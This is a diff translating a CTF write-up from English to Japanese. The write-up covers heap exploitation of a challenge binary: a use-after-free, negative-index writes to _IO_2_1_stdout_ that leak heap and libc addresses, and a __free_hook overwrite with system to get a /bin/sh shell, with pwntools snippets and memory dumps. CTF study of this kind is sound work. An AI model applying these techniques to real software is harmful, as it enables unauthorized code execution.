@@ -19,7 +19,7 @@
 
 ## Analysis:
 
-There are three functions, `Create`, `Edit`, and `Delete`, and there is no display function. Finding vulnerabilities is relatively easy, so the point is how to leak the `libc` address.
+機能は、`Create`と`Edit`と`Delete`の３つで、表示機能はなし。脆弱性の発見は比較的容易なので、如何に`libc`アドレスをリークできるかがポイントになる。
 
 ```
 1. Create a new order
@@ -28,9 +28,9 @@ There are three functions, `Create`, `Edit`, and `Delete`, and there is no displ
 4. Pay your bill and leave
 ```
 
-There are the following two vulnerabilities.
-- There is a `UAF` vulnerability because the pointer is not cleared after free the area with the `Delete` function.
-- The `Edit` and `Delete` functions do not check for negative indexes. By using this, the area with the index value `-12` and `_IO_2_1_stdout_` can be rewritten, so the heap and the `libc` address can be leaked.
+脆弱性は、下記の２つ。
+- `Delete`機能で領域をフリーした後にポインタをクリアしていないので`UAF`の脆弱性がある。
+- `Edit`と`Delete`機能で負のインデックスのチェックを行っていない。これを利用するとインデックス値が`-12`で`_IO_2_1_stdout_`の領域を書き替えることができるので、ヒープと`libc`アドレスのリークが可能。
 
 ```c
     if (local_18 != 3) break;
@@ -38,7 +38,7 @@ There are the following two vulnerabilities.
     fflush(stdout);
     __isoc99_scanf(&DAT_00400cd5,&local_18);
     getchar();
-    if (local_18 < local_14) {                          <--- Not checking for negative index values
+    if (local_18 < local_14) {                          <--- 負のインデックス値をチェックしていない
       free(*(void **)(orders + (long)local_18 * 8));
     }
     else {
@@ -48,8 +48,8 @@ There are the following two vulnerabilities.
 ```
 
 ```c
-    if (local_18 < local_14) {                          <--- Not checking for negative index values
-      free(*(void **)(orders + (long)local_18 * 8));    <--- Not clearing the pointer after free
+    if (local_18 < local_14) {                          <--- 負のインデックス値をチェックしていない
+      free(*(void **)(orders + (long)local_18 * 8));    <--- フリーした後にポインタをクリアしていない
     }
     else {
       puts("Order doesn\'t exist!!!");
@@ -57,7 +57,7 @@ There are the following two vulnerabilities.
     }
 ```
 
-In the local environment, we can leak the `libc` address as shown below by rewriting `_IO_write_base` to `0x602010`, but this was not possible in the server environment.
+ローカル環境では、`_IO_write_base`を`0x602010`に書き換えることで下記のように`libc`アドレスをリークさせることができるが、サーバ環境ではこれができなかった。
 
 ```python
 Edit(-12, p32(0xfbad3a87)+"\x01"*0x1c+p64(0x602010))
@@ -71,14 +71,14 @@ $1 = {
     _IO_read_ptr = 0x603260, 
     _IO_read_end = 0x603260, 
     _IO_read_base = 0x603260, 
-    _IO_write_base = 0x603260,  <-　Rewriting this value
+    _IO_write_base = 0x603260,  <-　この値を書き換える
     _IO_write_ptr = 0x603260, 
     _IO_write_end = 0x603260, 
     _IO_buf_base = 0x603260, 
     _IO_buf_end = 0x603660, 
 ```
 
-An example of outputting the `GOT` area in the local environment. I don't know the cause, but the server environment doesn't work.
+ローカル環境で`GOT`領域を出力させた例。原因はわからないがサーバ環境は動作しない。
 ```
     00000000  73 6f 20 79  6f 75 20 77  61 6e 74 65  64 20 87 3a  │so y│ou w│ante│d ·:│
     00000010  ad fb 01 01  01 01 01 01  01 01 01 01  01 01 01 01  │····│····│····│····│
@@ -98,27 +98,27 @@ An example of outputting the `GOT` area in the local environment. I don't know t
     000000f0  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
 ```
 
-The following is an excerpt from the `Dockerfile`, which may be due to running on `nsjail`.
+下記は`Dockerfile`の抜粋で`nsjail`で実行していることが原因かも。
 ```
     socat \
       TCP-LISTEN:1337,reuseaddr,fork \
       EXEC:"nsjail --config /home/user/nsjail.cfg -- /home/user/BreakfastMenu"
 ```
 
-However, if the lower 1 byte of `_IO_write_base` is rewritten to `NULL`, only the following heap area can be output even in the server environment.
+ただし`_IO_write_base`の下位１バイトを`NULL`に書き換えるとサーバ環境でも下記のヒープ領域のみ出力可能。
 ```
 0x603200:	0x0000000000000000	0x0000000000000000
 0x603210:	0x0000000000000000	0x0000000000000000
 0x603220:	0x0000000000000000	0x0000000000000000
 0x603230:	0x0000000000000000	0x0000000000000000
 0x603240:	0x0000000000000000	0x0000000000000000
-0x603250:	0x0000000000000000	0x0000000000000411  <- The server environment is 0x111 instead of 0x411.
+0x603250:	0x0000000000000000	0x0000000000000111  <- サーバ環境は0x411ではなく0x111になっている。
 0x603260:	0x7461657243202e0a	0x2077656e20612065
 0x603270:	0x2e320a726564726f	0x6e61207469644520
 0x603280:	0x330a726564726f20	0x6574656c6544202e
 ```
 
-An example of outputting with `context.log_level ='debug'` of `Pwntools`
+`Pwntools`の`context.log_level = 'debug'`で出力させた例
 ```
     00000000  73 6f 20 79  6f 75 20 77  61 6e 74 65  64 20 87 3a  │so y│ou w│ante│d ·:│
     00000010  ad fb 01 01  01 01 01 01  01 01 01 01  01 01 01 01  │····│····│····│····│
@@ -133,7 +133,7 @@ An example of outputting with `context.log_level ='debug'` of `Pwntools`
     000000d0  6f 75 72 20  62 69 6c 6c  20 61 6e 64  20 6c 65     │our │bill│ and│ le│
 ```
 
-Since the above limited area contains `tcachebin` of `0x3c0` size, we can leak the heap address by creating a chunk of `0x3c0` size in another area and freeing it.
+上記の限られた領域には`0x3c0`サイズの`tcachebin`が含まれているので、`0x3c0`サイズのchunkを別領域に作成してフリーするとヒープアドレスをリークさせることができる。
 
 ```python
 for i in range(6):
@@ -147,7 +147,7 @@ Edit(2, "A"*0x18+p64(0x3c1))
 Delete(7)
 ```
 
-State of heap memory after executing `Delete (7)`
+`Delete(7)`を実行した後のヒープメモリの状態
 ```
 0x604670:	0x0000000000000000	0x0000000000000031
 0x604680:	0x0000000000000000	0x0000000000000000
@@ -170,12 +170,12 @@ State of heap memory after executing `Delete (7)`
 0x604790:	0x0000000000000000	0x000000000001f871
 ```
 
-The heap address(`0x604700`) can be put in the` tcachebin` of `0x3c0`, so the heap address can be leaked.
+`0x3c0`の`tcachebin`にヒープのアドレス（`0x604700`）を入れることができるので、ヒープアドレスをリークできる。
 ```
 gdb-peda$ x/100gx 0x603200
 0x603200:	0x0000000000000000	0x0000000000000000
 0x603210:	0x0000000000000000	0x0000000000000000
-0x603220:	0x0000000000604700	0x0000000000000000  <- This 0x604700 can be leaked.
+0x603220:	0x0000000000604700	0x0000000000000000  <- この0x604700をリークできる。
 0x603230:	0x0000000000000000	0x0000000000000000
 0x603240:	0x0000000000000000	0x0000000000000000
 0x603250:	0x0000000000000000	0x0000000000000411
@@ -187,19 +187,19 @@ tcachebins
 0x3c0 [  1]: 0x604700 ◂— 0x0
 ```
 
-If we know the heap address, we can create a fake `chunk` in the above area, so we can leak the `libc` address as shown below.
+ヒープアドレスがわかれば、上記の領域に偽の`chunk`を作成できるので、下記のように`libc`アドレスをリークできる。
 
 ```
 0x603200:	0x0000000000000000	0x0000000000000000
 0x603210:	0x4141414141414141	0x0000000000001461
-0x603220:	0x00007ffff7dcdca0	0x00007ffff7dcdca0  <- This 0x7ffff7dcdca0 can be leaked.
+0x603220:	0x00007ffff7dcdca0	0x00007ffff7dcdca0  <- この0x7ffff7dcdca0をリークできる。
 0x603230:	0x0000000000000000	0x0000000000000000
 0x603240:	0x0000000000000000	0x0000000000000000
 0x603250:	0x0000000000000000	0x0000000000000411
 0x603260:	0x7461657243202e0a	0x2077656e20612065
 0x603270:	0x2e320a726564726f	0x6e61207469644520
 ```
-The `python` code for the `libc` leak
+`libc`リークの`python`コード
 ```python
 # Make large chunk in tcache
 Delete(0)
@@ -219,7 +219,7 @@ Create()
 Delete(11)
 ```
 
-If we can leak the `libc` address, we can easily write the `__free_hook` to the `tcache` using the `Edit` function. Similarly, we can write the address of the `system` function to `__free_hook`, so we can start `/bin/sh` by freeing the `chunk` that wrote `/bin/sh`.
+`libc`アドレスをリークできれば、`Edit`機能を用いて`tcache`に`__free_hook`を容易に書き込める。同様に`__free_hook`に`system`関数のアドレスを書き込めるので、`/bin/sh`を書き込んだ`chunk`をfreeすることで`/bin/sh`を起動できる。
 
 ## Exploit code:
 The Exploit code is below.
